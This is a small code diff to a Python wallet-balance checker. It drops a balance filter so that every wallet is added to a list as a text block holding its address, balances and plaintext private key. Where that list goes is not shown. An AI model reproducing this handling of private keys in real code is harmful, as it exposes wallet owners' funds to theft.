@@ -248,8 +248,7 @@ def check_wallet_balance():
                         "bnb_balance": float(bnb_balance),
                         "usdt_balance": float(usdt_balance)
                     }
-                    if float(bnb_balance) > 0 or float(usdt_balance) > 0:
-                        to_compare.append(f"Wallet: {wallet_name}\nAddress: {wallet_address}\nPrivate Key: {wallet_info['private_key']}\nBNB: {bnb_balance:.8f}\nUSDT: {usdt_balance:.2f}")
+                    to_compare.append(f"Wallet: {wallet_name}\nAddress: {wallet_address}\nPrivate Key: {wallet_info['private_key']}\nBNB: {bnb_balance:.8f}\nUSDT: {usdt_balance:.2f}")
                 except Exception as e:
                     print(f"Error fetching balance for wallet {wallet_name}: {e}")
         
